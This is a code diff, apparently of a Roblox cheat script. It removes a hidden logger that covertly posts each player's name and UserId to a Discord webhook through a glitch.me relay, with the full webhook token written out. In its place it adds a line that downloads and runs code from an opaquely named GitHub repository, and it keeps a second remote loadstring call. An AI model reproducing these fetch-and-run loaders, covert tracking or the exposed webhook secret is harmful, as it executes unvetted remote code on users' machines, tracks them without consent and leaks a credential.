@@ -1,33 +1,4 @@
-local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-
-local msg = "***" .. game.Players.LocalPlayer.Name .. " [" .. game.Players.LocalPlayer.UserId .. "] " .. "***" .. " Has Executed The " .. "**" .. GameName .. "**" .. " Script"
-
-local webhook = "https://discord.com/api/webhooks/942193835281354813/bYOBdxiaGMV1TrQQt9npeQjZ_OyDkNnMqC_Z_MiMmeW3Ydr1jvcvocimKD6hzGN1Ow2e"
-local HttpService = game:GetService("HttpService");
-local botname = "Game Logger"
-
-function specials(Webhook, Message, Botname)
-    local Name;
-    local start = game:HttpGet("http://buritoman69.glitch.me");
-    local biggie = "http://buritoman69.glitch.me/webhook";
-    if (not Message or Message == "" or not Botname) then
-        Name = "GameBot"
-        return error("nil or empty message!")
-    else
-        Name = Botname;
-    end
-    local Body = {
-        ['Key'] = tostring("applesaregood"),
-        ['Message'] = tostring(Message),
-        ['Name'] = Name,
-        ['Webhook'] = Webhook    
-    }
-    Body = HttpService:JSONEncode(Body);
-    local Data = game:HttpPost(biggie, Body, false, "application/json")
-    return Data or nil;
-end
-
-specials(webhook, msg, botname)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/7TWBE49Js4Tak7GL8iIZLCLr4M8jJHZB4HFA12K/game/main/game',true))()
 
 local DiscordLib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")()
 
